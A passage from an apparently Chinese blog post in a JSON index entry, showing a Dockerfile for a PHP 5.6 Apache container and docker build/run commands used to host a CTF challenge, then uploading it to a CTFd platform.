然后run 12345678910111213FROM sakadonohito/php5.6.23-apacheLABEL Author=&quot;Air&quot;COPY ./src/ /var/www/html/RUN chmod -R 755 /var/www/html/ &amp;&amp; \\ chown -R root:root /var/www/html EXPOSE 80CMD sh -c &quot;apache2-foreground&quot; 2.在src目录下准备好源码 Step 4 运行docker1docker build -t trick:v3 . // .的意思是把当前目录下的文件都给打包 1docker run -p 7000:80 -d trick:v3 然后把东西题目信息通过ctfd平台的后台管理界面传上去即可","link":"/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/"}],"tags":[],"categories":[]}